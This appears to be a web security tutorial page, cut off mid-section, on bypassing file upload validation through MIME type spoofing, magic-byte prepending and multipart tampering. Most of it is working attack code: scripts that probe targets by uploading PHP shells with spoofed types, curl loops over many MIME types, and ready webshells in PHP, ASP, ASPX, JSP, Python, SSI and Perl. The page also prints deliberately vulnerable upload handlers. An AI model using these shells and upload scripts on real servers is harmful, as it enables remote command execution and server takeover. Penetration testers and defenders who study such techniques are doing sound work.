---
title: MIME Type Spoofing
description: MIME type manipulation, Content-Type header spoofing, magic byte injection, polyglot file crafting, and multipart request tampering to achieve remote code execution, stored XSS, and server compromise.
navigation:
  icon: i-lucide-file-type
  title: MIME Type Spoofing
---

## What Is MIME Type Spoofing

::badge
**High to Critical — CWE-434 / CWE-345**
::

MIME type spoofing is a file upload bypass technique that exploits the fundamental trust relationship between a web application and the HTTP metadata it receives from the client. Every file upload over HTTP is accompanied by a `Content-Type` header value embedded within the multipart request body. This value tells the server what kind of file was sent — `image/jpeg` for JPEG images, `application/pdf` for PDF documents, `text/plain` for text files. The critical vulnerability is that **this value is entirely controlled by the client** and can be set to anything regardless of the actual file content.

When a developer writes server-side validation that checks `$_FILES['file']['type']` in PHP, `request.files['file'].content_type` in Python, or `req.file.mimetype` in Node.js, they are reading a value that the attacker typed into their request. There is zero protocol enforcement. The browser sets this value based on the file extension when the user selects a file, but any interception proxy — Burp Suite, mitmproxy, or even a curl command — can override it to say anything.

::note
MIME type validation is the weakest form of file upload security. In bug bounty programs, it is the first thing to test because many developers mistakenly believe `Content-Type` is a reliable indicator of file content. It is not — it is user input.
::

The attack surface extends beyond the simple `Content-Type` header into three deeper layers.

::card-group
  :::card
  ---
  icon: i-lucide-arrow-up
  title: Content-Type Header Spoofing
  ---
  The `Content-Type` value within the multipart body is client-controlled. Changing `application/x-php` to `image/jpeg` in any interception proxy bypasses validation that reads this header. This is a single-field modification requiring zero skill.
  
  **Server sees:** `Content-Type: image/jpeg` → Accepts upload
  **File actually contains:** `<?php system($_GET['cmd']); ?>`
  :::

  :::card
  ---
  icon: i-lucide-binary
  title: Magic Byte Injection
  ---
  File signatures (magic bytes) are the first bytes of a file that identify its format. The Linux `file` command, PHP `finfo_file()`, and Python `python-magic` all read these bytes. Prepending `\xFF\xD8\xFF\xE0` (JPEG) or `GIF89a` (GIF) to a PHP shell makes content-based validators identify it as a legitimate image.
  
  **file command sees:** `JPEG image data, JFIF standard`
  **File actually contains:** JPEG header + PHP webshell
  :::

  :::card
  ---
  icon: i-lucide-combine
  title: Combined Multi-Layer Bypass
  ---
  When the application cross-validates Content-Type header, magic bytes, and file extension simultaneously, all three must agree. Using a JPEG header, `image/jpeg` Content-Type, and `.jpg` extension while hiding PHP code in EXIF metadata or after the image header defeats multi-layer validation.
  
  **All checks pass:** Extension ✓ MIME ✓ Content ✓
  **Hidden payload:** PHP shell embedded in EXIF Comment field
  :::

  :::card
  ---
  icon: i-lucide-settings
  title: Multipart Request Tampering
  ---
  The HTTP multipart structure itself — boundary values, header ordering, duplicate parameters, encoding — can be manipulated to confuse server parsers and WAFs. Different software components parse the same multipart request differently, creating desynchronization opportunities.
  
  **WAF sees:** Safe image upload
  **Application server sees:** PHP file upload
  :::
::

---

## How Servers Validate MIME Types

Understanding exactly what the server checks determines which bypass technique to use. Blindly testing all techniques wastes time and creates noise. Identify the validation layer first, then apply the targeted bypass.

::accordion
  :::accordion-item{icon="i-lucide-scan" label="Layer 1 — Content-Type Header Check (Weakest)"}
  The most common and weakest validation. The server reads the `Content-Type` value from the multipart body part header and compares it against a whitelist. This value comes directly from the HTTP request and is fully controlled by the attacker.

  ```
  POST /upload HTTP/1.1
  Host: target.com
  Content-Type: multipart/form-data; boundary=----Boundary

  ------Boundary
  Content-Disposition: form-data; name="file"; filename="shell.php"
  Content-Type: application/x-httpd-php     ← SERVER READS THIS
  
  <?php system($_GET['cmd']); ?>
  ------Boundary--
  ```

  The server-side code doing this check typically looks like one of these patterns across different languages.

  ```php
  // VULNERABLE PHP — $_FILES type comes from client request
  $allowed = ['image/jpeg', 'image/png', 'image/gif'];
  if (!in_array($_FILES['file']['type'], $allowed)) {
      die("Invalid file type");
  }
  move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $_FILES['file']['name']);
  // Bypass: Set Content-Type: image/jpeg for shell.php
  ```

  ```python
  # VULNERABLE Python/Flask — content_type comes from client
  ALLOWED = {'image/jpeg', 'image/png', 'image/gif'}
  uploaded = request.files['file']
  if uploaded.content_type not in ALLOWED:
      return "Invalid type", 400
  uploaded.save(os.path.join('uploads', uploaded.filename))
  # Bypass: Set Content-Type: image/jpeg for shell.py
  ```

  ```javascript
  // VULNERABLE Node.js/Express with multer
  upload.single('file')(req, res, (err) => {
    if (!['image/jpeg','image/png'].includes(req.file.mimetype)) {
      return res.status(400).send('Invalid');
    }
    // req.file.mimetype is from Content-Type header
    // Bypass: Set Content-Type: image/jpeg
  });
  ```

  ```java
  // VULNERABLE Java/Spring
  @PostMapping("/upload")
  public String upload(@RequestParam("file") MultipartFile file) {
      String contentType = file.getContentType(); // From client!
      if (!contentType.startsWith("image/")) {
          throw new RuntimeException("Not an image");
      }
      // Bypass: Set Content-Type: image/jpeg
  }
  ```

  **Bypass:** Single header value change. Change Content-Type to any allowed MIME type.
  :::

  :::accordion-item{icon="i-lucide-scan" label="Layer 2 — Magic Byte / File Signature Check (Moderate)"}
  Stronger validation reads the actual first bytes of the uploaded file content and compares them against known file signatures. This cannot be bypassed by changing HTTP headers alone because the server reads the actual file data.

  ```php
  // STRONGER PHP — finfo reads actual file bytes
  $finfo = finfo_open(FILEINFO_MIME_TYPE);
  $detected = finfo_file($finfo, $_FILES['file']['tmp_name']);
  finfo_close($finfo);
  
  if (!in_array($detected, ['image/jpeg', 'image/png', 'image/gif'])) {
      die("Not a valid image");
  }
  // finfo reads FIRST BYTES of file, not the Content-Type header
  // Bypass: Prepend GIF89a or \xFF\xD8\xFF\xE0 to PHP shell
  ```

  ```python
  # STRONGER Python — python-magic reads file bytes
  import magic
  
  uploaded = request.files['file']
  content = uploaded.read()
  detected = magic.from_buffer(content, mime=True)
  
  if detected not in {'image/jpeg', 'image/png', 'image/gif'}:
      return "Not a valid image", 400
  # Bypass: Prepend image magic bytes to shell content
  ```

  ```bash
  # How magic byte detection works
  # The 'file' command reads first bytes and matches against signatures:
  echo '<?php system("id"); ?>' > test.php
  file test.php
  # Output: PHP script, ASCII text
  
  # Add GIF header
  printf 'GIF89a\n<?php system("id"); ?>' > test.gif
  file test.gif
  # Output: GIF image data, version 89a   ← Fooled!
  
  # Add JPEG header
  printf '\xff\xd8\xff\xe0<?php system("id"); ?>' > test.jpg
  file test.jpg
  # Output: JPEG image data               ← Fooled!
  ```

  **Bypass:** Prepend valid magic bytes to the beginning of the malicious file.
  :::

  :::accordion-item{icon="i-lucide-scan" label="Layer 3 — Full Image Parsing (Strong)"}
  The strongest validation opens the file as an image using a library like GD (PHP), Pillow/PIL (Python), ImageMagick, or Sharp (Node.js). If the library cannot decode the file as a valid image, the upload is rejected. Some applications go further and **re-render** the image — converting it to a new file, which strips all non-image data including embedded code.

  ```php
  // ROBUST PHP — GD library validates and re-renders
  $tmp = $_FILES['file']['tmp_name'];
  $info = getimagesize($tmp);
  if ($info === false) {
      die("Not a valid image");
  }
  
  // Re-render (destroys embedded PHP code)
  $src = imagecreatefromjpeg($tmp);
  $safe = "uploads/" . uniqid() . ".jpg";
  imagejpeg($src, $safe, 85);
  imagedestroy($src);
  ```

  ```python
  # ROBUST Python — Pillow validates and re-renders
  from PIL import Image
  import io, uuid
  
  uploaded = request.files['file']
  try:
      img = Image.open(io.BytesIO(uploaded.read()))
      img.verify()
  except Exception:
      return "Not a valid image", 400
  
  # Re-render
  img = Image.open(io.BytesIO(uploaded.read()))
  img = img.convert('RGB')
  img.save(f"uploads/{uuid.uuid4()}.jpg", "JPEG", quality=85)
  ```

  **Bypass difficulty:** Very high. Requires true polyglot files, EXIF metadata injection that survives re-rendering, or exploiting vulnerabilities in the image processing library itself (ImageTragick, Pillow CVEs, GD bugs). Often must chain with other vulnerabilities like LFI or `.htaccess` upload.
  :::

  :::accordion-item{icon="i-lucide-scan" label="Layer 4 — Cross-Validation (Header + Content + Extension)"}
  Some applications cross-check multiple data points and reject uploads when they disagree. The Content-Type header must match the magic bytes which must match the file extension.

  ```python
  # CROSS-VALIDATION — all three must agree
  import magic, os
  
  uploaded = request.files['file']
  filename = uploaded.filename
  content = uploaded.read()
  
  ext = os.path.splitext(filename)[1].lower()
  if ext not in {'.jpg', '.jpeg', '.png', '.gif'}:
      return "Bad extension", 400
  
  if uploaded.content_type not in {'image/jpeg', 'image/png', 'image/gif'}:
      return "Bad content type", 400
  
  detected = magic.from_buffer(content, mime=True)
  if detected not in {'image/jpeg', 'image/png', 'image/gif'}:
      return "Bad file content", 400
  
  ext_to_mime = {'image/jpeg': {'.jpg','.jpeg'}, 'image/png': {'.png'}, 'image/gif': {'.gif'}}
  if ext not in ext_to_mime.get(detected, set()):
      return "Extension/content mismatch", 400
  ```

  **Bypass:** All three signals must agree. Use `.jpg` extension + `image/jpeg` Content-Type + JPEG magic bytes, with PHP code hidden inside EXIF metadata or appended after valid image structure. Then chain with double extension, `.htaccess` upload, `.user.ini` upload, or LFI for execution.
  :::
::

---

## Identifying the Validation Type

::warning
Before attempting any bypass, run these diagnostic tests to determine exactly which validation layers are in place. Each test isolates one variable to identify the specific check.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Bash Detection Script"}
  ```bash
  #!/bin/bash
  # ╔══════════════════════════════════════════════════╗
  # ║   MIME Validation Layer Detector                 ║
  # ║   Identifies which upload checks are in place    ║
  # ╚══════════════════════════════════════════════════╝
  
  TARGET="${1:?Usage: $0 <upload_url> <session_cookie> [field_name]}"
  COOKIE="${2:?Provide session cookie}"
  FIELD="${3:-file}"
  
  echo "Target: $TARGET"
  echo "Field:  $FIELD"
  echo ""
  
  # Helper function
  upload_test() {
    local desc="$1" file="$2" mime="$3"
    STATUS=$(curl -so /tmp/upload_resp.txt -w "%{http_code}" -X POST "$TARGET" \
      -F "$FIELD=@$file;type=$mime" -b "$COOKIE" 2>/dev/null)
    BODY=$(cat /tmp/upload_resp.txt 2>/dev/null)
    # Check for error indicators in response body
    if [ "$STATUS" = "200" ] || [ "$STATUS" = "201" ]; then
      if echo "$BODY" | grep -qiE "error|invalid|rejected|not allowed|bad file|failed"; then
        echo "  [BLOCKED]  $desc → HTTP $STATUS (error in body)"
        return 1
      fi
      echo "  [ACCEPTED] $desc → HTTP $STATUS"
      return 0
    else
      echo "  [BLOCKED]  $desc → HTTP $STATUS"
      return 1
    fi
  }
  
  # Create test files
  printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xd9' > /tmp/t_legit.jpg
  echo '<?php echo "TEST"; ?>' > /tmp/t_shell.php
  cp /tmp/t_shell.php /tmp/t_shell.jpg
  printf 'GIF89a\n<?php echo "TEST"; ?>' > /tmp/t_magic_gif.gif
  printf 'GIF89a\n<?php echo "TEST"; ?>' > /tmp/t_magic_gif.php
  printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00<?php echo "TEST"; ?>' > /tmp/t_magic_jpg.jpg
  printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00<?php echo "TEST"; ?>' > /tmp/t_magic_jpg.php
  
  echo "──────────────────────────────────────────────────"
  echo " Test 1: Baseline — legitimate JPEG"
  upload_test "legit.jpg + image/jpeg" /tmp/t_legit.jpg "image/jpeg"
  T1=$?
  
  echo ""
  echo " Test 2: PHP shell + PHP MIME type"
  upload_test "shell.php + application/x-httpd-php" /tmp/t_shell.php "application/x-httpd-php"
  T2=$?
  
  echo ""
  echo " Test 3: PHP shell + spoofed image MIME"
  upload_test "shell.php + image/jpeg (spoofed)" /tmp/t_shell.php "image/jpeg"
  T3=$?
  
  echo ""
  echo " Test 4: PHP content + .jpg extension + image MIME"
  upload_test "shell.jpg + image/jpeg" /tmp/t_shell.jpg "image/jpeg"
  T4=$?
  
  echo ""
  echo " Test 5: GIF magic + PHP + .gif extension + image/gif"
  upload_test "GIF89a+shell.gif + image/gif" /tmp/t_magic_gif.gif "image/gif"
  T5=$?
  
  echo ""
  echo " Test 6: GIF magic + PHP + .php extension + image/gif"
  upload_test "GIF89a+shell.php + image/gif" /tmp/t_magic_gif.php "image/gif"
  T6=$?
  
  echo ""
  echo " Test 7: JPEG magic + PHP + .jpg extension + image/jpeg"
  upload_test "JPEG+shell.jpg + image/jpeg" /tmp/t_magic_jpg.jpg "image/jpeg"
  T7=$?
  
  echo ""
  echo " Test 8: JPEG magic + PHP + .php extension + image/jpeg"
  upload_test "JPEG+shell.php + image/jpeg" /tmp/t_magic_jpg.php "image/jpeg"
  T8=$?
  
  echo ""
  echo "══════════════════════════════════════════════════"
  echo " ANALYSIS"
  echo "══════════════════════════════════════════════════"
  
  if [ "$T1" -ne 0 ]; then
    echo " [!] Baseline FAILED — check URL, auth, field name"
    exit 1
  fi
  
  if [ "$T2" -ne 0 ] && [ "$T3" -eq 0 ]; then
    echo " → Content-Type header IS checked"
    echo "   Bypass: Change Content-Type to image/jpeg"
  fi
  
  if [ "$T3" -eq 0 ] && [ "$T4" -eq 0 ] && [ "$T6" -eq 0 ]; then
    echo " → Content-Type ONLY validation (no extension or magic check)"
    echo "   Bypass: Just spoof Content-Type header — easiest"
  fi
  
  if [ "$T3" -ne 0 ] && [ "$T4" -eq 0 ]; then
    echo " → Extension IS checked (blocks .php, allows .jpg)"
    echo "   Bypass: Use safe extension + chain with .htaccess or LFI"
  fi
  
  if [ "$T4" -ne 0 ] && [ "$T5" -eq 0 ]; then
    echo " → Magic bytes ARE checked"
    echo "   Bypass: Prepend magic bytes + use safe extension"
  fi
  
  if [ "$T5" -eq 0 ] && [ "$T6" -ne 0 ]; then
    echo " → Extension IS checked (even with valid magic bytes)"
    echo "   Bypass: Magic bytes + safe extension + chain for execution"
  fi
  
  if [ "$T5" -eq 0 ] && [ "$T6" -eq 0 ]; then
    echo " → Extension is NOT checked (magic bytes sufficient)"
    echo "   Bypass: Magic bytes + .php extension + spoofed MIME"
  fi
  
  if [ "$T5" -ne 0 ] && [ "$T7" -ne 0 ]; then
    echo " → Full content analysis / image re-rendering detected"
    echo "   Bypass: True polyglot, EXIF injection, or library exploit"
  fi
  
  # Cleanup
  rm -f /tmp/t_legit.jpg /tmp/t_shell.php /tmp/t_shell.jpg \
        /tmp/t_magic_gif.gif /tmp/t_magic_gif.php \
        /tmp/t_magic_jpg.jpg /tmp/t_magic_jpg.php /tmp/upload_resp.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Python Detection Script"}
  ```python
  #!/usr/bin/env python3
  """
  MIME Validation Layer Detector
  Sends targeted test uploads to identify exactly which validation checks exist.
  
  Usage: python3 detect_mime.py <url> <cookie> [field]
  """
  import requests, io, sys, urllib3
  urllib3.disable_warnings()
  
  class MIMEDetector:
      def __init__(self, url, cookie, field="file"):
          self.url = url
          self.field = field
          self.s = requests.Session()
          self.s.verify = False
          for c in cookie.split(";"):
              if "=" in c:
                  k, v = c.strip().split("=", 1)
                  self.s.cookies.set(k, v)
  
      def test(self, filename, content, mime):
          try:
              files = {self.field: (filename, io.BytesIO(content), mime)}
              r = self.s.post(self.url, files=files, timeout=10)
              ok = r.status_code in [200, 201, 204]
              if ok and any(w in r.text.lower()[:500] for w in ['error','invalid','reject','fail','not allow','bad']):
                  ok = False
              return ok, r.status_code
          except Exception as e:
              return False, str(e)
  
      def detect(self):
          php = b'<?php echo "DETECT_TEST"; ?>'
          gif_php = b'GIF89a\n' + php
          jpg_php = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00' + php
          png_php = b'\x89PNG\r\n\x1a\n' + php
          jpg_valid = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xd9'
  
          tests = [
              ("T1 Baseline: legit.jpg + image/jpeg",        "legit.jpg",   jpg_valid, "image/jpeg"),
              ("T2 PHP + PHP MIME",                           "shell.php",   php,       "application/x-httpd-php"),
              ("T3 PHP + image/jpeg MIME",                    "shell.php",   php,       "image/jpeg"),
              ("T4 PHP content + .jpg + image/jpeg",          "shell.jpg",   php,       "image/jpeg"),
              ("T5 GIF89a+PHP + .gif + image/gif",            "shell.gif",   gif_php,   "image/gif"),
              ("T6 GIF89a+PHP + .php + image/gif",            "shell.php",   gif_php,   "image/gif"),
              ("T7 JPEG_hdr+PHP + .jpg + image/jpeg",         "shell.jpg",   jpg_php,   "image/jpeg"),
              ("T8 JPEG_hdr+PHP + .php + image/jpeg",         "shell.php",   jpg_php,   "image/jpeg"),
              ("T9 PNG_hdr+PHP + .png + image/png",            "shell.png",   png_php,   "image/png"),
              ("T10 PHP + .jpg + octet-stream",                "shell.jpg",   php,       "application/octet-stream"),
              ("T11 PHP + .php + octet-stream",                "shell.php",   php,       "application/octet-stream"),
              ("T12 PHP + .php + text/plain",                  "shell.php",   php,       "text/plain"),
          ]
  
          print(f"\nTarget: {self.url}\n")
          print(f"  {'Test':<50} {'Result':<10} {'HTTP'}")
          print("  " + "-" * 72)
  
          R = {}
          for desc, fn, content, mime in tests:
              ok, status = self.test(fn, content, mime)
              R[desc[:2]] = ok
              mark = "✓ PASS" if ok else "✗ FAIL"
              print(f"  {desc:<50} {mark:<10} {status}")
  
          print(f"\n  {'═' * 60}")
          print(f"  DETECTED VALIDATION:")
          print(f"  {'═' * 60}")
  
          if not R.get("T1"):
              print("  [!] Baseline FAILED. Check URL, auth, field name.")
              return
  
          if not R.get("T2") and R.get("T3"):
              print("  ✓ Content-Type header IS validated")
          if R.get("T3") and R.get("T4") and R.get("T6"):
              print("  → CONTENT-TYPE ONLY (no extension or magic check)")
              print("    EASIEST bypass: just spoof Content-Type")
          if not R.get("T3") and R.get("T4"):
              print("  ✓ Extension IS validated")
          if not R.get("T4") and R.get("T5"):
              print("  ✓ Magic bytes ARE validated")
          if R.get("T5") and not R.get("T6"):
              print("  ✓ Extension checked EVEN WITH valid magic bytes")
          if R.get("T5") and R.get("T6"):
              print("  → Extension NOT checked when magic bytes match")
              print("    Bypass: magic bytes + .php extension")
          if not R.get("T5") and not R.get("T7"):
              print("  → FULL CONTENT ANALYSIS / IMAGE RE-RENDERING")
              print("    Hardest bypass: polyglot, EXIF, or library exploit")
          if R.get("T7") and not R.get("T5"):
              print("  → Magic bytes checked — JPEG header sufficient, GIF rejected")
  
  if __name__ == "__main__":
      if len(sys.argv) < 3:
          print(f"Usage: {sys.argv[0]} <url> <cookie> [field]")
          sys.exit(1)
      MIMEDetector(sys.argv[1], sys.argv[2], sys.argv[3] if len(sys.argv) > 3 else "file").detect()
  ```
  :::

  :::tabs-item{icon="i-lucide-monitor" label="Burp Suite Manual Detection"}
  ```
  ═══════════════════════════════════════════════════════════
   BURP SUITE MANUAL MIME VALIDATION DETECTION
  ═══════════════════════════════════════════════════════════
  
  Step 1: Upload a legitimate JPEG image
    → Capture request in Proxy → Send to Repeater
    → Note the SUCCESS response pattern (status, body keywords, URL)
    → This is your baseline
  
  Step 2: In Repeater, change ONLY the Content-Type value
    Original: Content-Type: image/jpeg
    Modified: Content-Type: application/x-httpd-php
    → If BLOCKED → Server checks Content-Type header
    → If ACCEPTED → Server does NOT check Content-Type
  
  Step 3: Restore Content-Type, replace file bytes with PHP code
    Keep: Content-Type: image/jpeg
    Replace file body with: <?php phpinfo(); ?>
    → If BLOCKED → Server checks file content (magic bytes or full parse)
    → If ACCEPTED → Server only checks Content-Type header
  
  Step 4: Keep spoofed Content-Type, add magic bytes before PHP
    Content-Type: image/jpeg
    File body: \xFF\xD8\xFF\xE0 + <?php phpinfo(); ?>
    (In Burp hex editor: ff d8 ff e0 before the PHP code)
    → If BLOCKED → Server does full image parsing (not just magic bytes)
    → If ACCEPTED → Server only checks magic bytes
  
  Step 5: Change the filename extension
    Test with filename="shell.php" vs filename="shell.jpg"
    Using the same content and Content-Type from Step 4
    → Compare results to determine if extension is validated
  
  Step 6: Document which combination was accepted
    This tells you exactly which bypass technique to use
  
  ═══════════════════════════════════════════════════════════
   RESPONSE COMPARISON MATRIX
  ═══════════════════════════════════════════════════════════
  
  Test | CT Header | Magic Bytes | Extension | PHP Content | → Result
  ─────┼───────────┼─────────────┼───────────┼─────────────┼─────────
   1   | image/jpg | ✓ JPEG      | .jpg      | ✗ None      | BASELINE
   2   | x-php     | ✓ JPEG      | .jpg      | ✗ None      | CT check?
   3   | image/jpg | ✗ None      | .php      | ✓ PHP       | All checks
   4   | image/jpg | ✗ None      | .jpg      | ✓ PHP       | Magic chk?
   5   | image/jpg | ✓ GIF89a    | .gif      | ✓ PHP       | Magic+ext
   6   | image/jpg | ✓ GIF89a    | .php      | ✓ PHP       | Ext check?
  ```
  :::
::

---

## Content-Type Header Spoofing

The simplest and most common MIME bypass. The `Content-Type` value in the multipart request body part is client-controlled and modifiable with any interception proxy, curl, or Python script.

### Image MIME Type Spoofing

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Common Image MIME Spoofing"}
  ```bash
  # ═══════════════════════════════════════════
  #  Basic Content-Type Spoofing via curl
  # ═══════════════════════════════════════════
  
  # Create PHP webshell
  echo '<?php system($_GET["cmd"]); ?>' > shell.php
  
  # Upload with image/jpeg MIME type
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;type=image/jpeg" \
    -b "session=YOUR_COOKIE" -v
  
  # Upload with image/png MIME type
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;type=image/png" \
    -b "session=YOUR_COOKIE"
  
  # Upload with image/gif MIME type
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;type=image/gif" \
    -b "session=YOUR_COOKIE"
  
  # Upload with image/webp MIME type
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;type=image/webp" \
    -b "session=YOUR_COOKIE"
  
  # Upload with image/bmp MIME type
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;type=image/bmp" \
    -b "session=YOUR_COOKIE"
  
  # Upload with image/tiff MIME type
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;type=image/tiff" \
    -b "session=YOUR_COOKIE"
  
  # Upload with image/svg+xml MIME type
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;type=image/svg+xml" \
    -b "session=YOUR_COOKIE"
  
  # ═══════════════════════════════════════════
  #  Batch test ALL common image MIME types
  # ═══════════════════════════════════════════
  
  echo '<?php echo md5("mime_spoof_confirmed"); ?>' > /tmp/test_shell.php
  HASH=$(echo -n "mime_spoof_confirmed" | md5sum | cut -d' ' -f1)
  
  IMAGE_MIMES=(
    "image/jpeg"
    "image/jpg"
    "image/png"
    "image/gif"
    "image/bmp"
    "image/webp"
    "image/tiff"
    "image/x-icon"
    "image/vnd.microsoft.icon"
    "image/svg+xml"
    "image/avif"
    "image/heic"
    "image/heif"
    "image/jp2"
    "image/jxr"
    "image/x-ms-bmp"
    "image/x-portable-pixmap"
    "image/x-xbitmap"
    "image/x-citrix-jpeg"
    "image/x-citrix-png"
    "image/x-png"
    "image/pjpeg"
  )
  
  echo "Testing ${#IMAGE_MIMES[@]} image MIME types..."
  echo ""
  
  ACCEPTED=()
  for mime in "${IMAGE_MIMES[@]}"; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
      -F "file=@/tmp/test_shell.php;type=$mime" -b "session=YOUR_COOKIE" 2>/dev/null)
    if [ "$STATUS" = "200" ] || [ "$STATUS" = "201" ]; then
      echo "  [+] ACCEPTED: $mime → HTTP $STATUS"
      ACCEPTED+=("$mime")
    else
      echo "  [-] BLOCKED:  $mime → HTTP $STATUS"
    fi
  done
  
  echo ""
  echo "${#ACCEPTED[@]} MIME types accepted PHP upload"
  for a in "${ACCEPTED[@]}"; do echo "  → $a"; done
  
  rm -f /tmp/test_shell.php
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Non-Image MIME Types"}
  ```bash
  # ═══════════════════════════════════════════
  #  Non-image MIME types that may bypass
  # ═══════════════════════════════════════════
  # Some whitelists include document, text, or generic types
  # Testing these may reveal unexpected acceptance
  
  echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
  
  # Document MIME types
  DOC_MIMES=(
    "application/pdf"
    "application/msword"
    "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
    "application/vnd.ms-excel"
    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
    "application/vnd.ms-powerpoint"
    "application/vnd.oasis.opendocument.text"
    "application/rtf"
    "text/csv"
  )
  
  # Text/code MIME types
  TEXT_MIMES=(
    "text/plain"
    "text/html"
    "text/xml"
    "text/css"
    "text/javascript"
    "text/json"
    "text/richtext"
    "text/x-php"
    "text/x-python"
    "text/x-java"
    "text/x-c"
  )
  
  # Application MIME types
  APP_MIMES=(
    "application/xml"
    "application/json"
    "application/javascript"
    "application/octet-stream"
    "application/x-httpd-php"
    "application/x-php"
    "application/php"
    "application/x-httpd-php-source"
    "application/x-www-form-urlencoded"
    "application/force-download"
    "application/x-download"
    "application/unknown"
    "application/x-empty"
    "application/zip"
    "application/x-gzip"
    "application/x-tar"
    "application/x-rar-compressed"
    "application/wasm"
  )
  
  # Binary/generic MIME types
  GENERIC_MIMES=(
    "binary/octet-stream"
    "multipart/form-data"
    "multipart/mixed"
    "*/*"
    "image/*"
  )
  
  echo "=== Document MIME Types ==="
  for mime in "${DOC_MIMES[@]}"; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
      -F "file=@/tmp/shell.php;type=$mime" -b "session=COOKIE" 2>/dev/null)
    [ "$STATUS" = "200" ] || [ "$STATUS" = "201" ] && echo "  [+] $mime → ACCEPTED"
  done
  
  echo ""
  echo "=== Text MIME Types ==="
  for mime in "${TEXT_MIMES[@]}"; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
      -F "file=@/tmp/shell.php;type=$mime" -b "session=COOKIE" 2>/dev/null)
    [ "$STATUS" = "200" ] || [ "$STATUS" = "201" ] && echo "  [+] $mime → ACCEPTED"
  done
  
  echo ""
  echo "=== Application MIME Types ==="
  for mime in "${APP_MIMES[@]}"; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
      -F "file=@/tmp/shell.php;type=$mime" -b "session=COOKIE" 2>/dev/null)
    [ "$STATUS" = "200" ] || [ "$STATUS" = "201" ] && echo "  [+] $mime → ACCEPTED"
  done
  
  echo ""
  echo "=== Generic/Wildcard MIME Types ==="
  for mime in "${GENERIC_MIMES[@]}"; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
      -F "file=@/tmp/shell.php;type=$mime" -b "session=COOKIE" 2>/dev/null)
    [ "$STATUS" = "200" ] || [ "$STATUS" = "201" ] && echo "  [+] $mime → ACCEPTED"
  done
  
  rm -f /tmp/shell.php
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Technology-Specific Shells + MIME"}
  ```bash
  # ═══════════════════════════════════════════
  #  Different server technologies need different shell payloads
  #  Always test with the right shell for the target tech
  # ═══════════════════════════════════════════
  
  # --- PHP Shell ---
  echo '<?php system($_GET["cmd"]); ?>' > shell.php
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;type=image/jpeg" -b "session=COOKIE"
  
  # --- ASP Classic Shell ---
  echo '<% eval request("cmd") %>' > shell.asp
  curl -X POST https://target.com/upload \
    -F "file=@shell.asp;type=image/jpeg" -b "session=COOKIE"
  
  # --- ASPX Shell ---
  cat > shell.aspx << 'EOF'
  <%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %>
  <%string c=Request["cmd"];if(c!=null){Process p=new Process();
  p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+c;
  p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;
  p.Start();Response.Write("<pre>"+p.StandardOutput.ReadToEnd()+"</pre>");}%>
  EOF
  curl -X POST https://target.com/upload \
    -F "file=@shell.aspx;type=image/jpeg" -b "session=COOKIE"
  
  # --- JSP Shell ---
  cat > shell.jsp << 'EOF'
  <%@ page import="java.util.*,java.io.*" %>
  <%String cmd=request.getParameter("cmd");if(cmd!=null){
  Process p=Runtime.getRuntime().exec(cmd);
  BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
  String l;while((l=br.readLine())!=null)out.println(l);}%>
  EOF
  curl -X POST https://target.com/upload \
    -F "file=@shell.jsp;type=image/jpeg" -b "session=COOKIE"
  
  # --- Python CGI Shell ---
  cat > shell.py << 'EOF'
  #!/usr/bin/env python3
  import subprocess,cgi
  print("Content-Type: text/html\n")
  params=cgi.FieldStorage()
  cmd=params.getvalue('cmd','id')
  print(f"<pre>{subprocess.getoutput(cmd)}</pre>")
  EOF
  curl -X POST https://target.com/upload \
    -F "file=@shell.py;type=image/jpeg" -b "session=COOKIE"
  
  # --- SSI Shell ---
  echo '<!--#exec cmd="id" -->' > shell.shtml
  curl -X POST https://target.com/upload \
    -F "file=@shell.shtml;type=image/jpeg" -b "session=COOKIE"
  
  # --- Perl CGI Shell ---
  cat > shell.pl << 'EOF'
  #!/usr/bin/perl
  use CGI;my $q=CGI->new;print $q->header('text/html');
  my $cmd=$q->param('cmd')||'id';print "<pre>".`$cmd`."</pre>";
  EOF
  curl -X POST https://target.com/upload \
    -F "file=@shell.pl;type=image/jpeg" -b "session=COOKIE"
  ```
  :::
::

### Content-Type Header Edge Cases

::caution
Beyond simple value substitution, the Content-Type header itself can be manipulated structurally. WAFs parse headers differently than application servers, creating bypass opportunities through capitalization, whitespace, parameters, and duplicate values.
::

::accordion
  :::accordion-item{icon="i-lucide-type" label="Case Variations & Whitespace"}
  HTTP headers are case-insensitive by specification, but many server implementations and WAFs check case-sensitively. Manipulating the casing of both the header name and the MIME type value can bypass poorly implemented filters.

  ```bash
  # ═══════════════════════════════════════════
  #  Content-Type Header Name Casing
  # ═══════════════════════════════════════════
  # These must be tested via Burp Suite or raw sockets
  # because curl and requests normalize header names
  
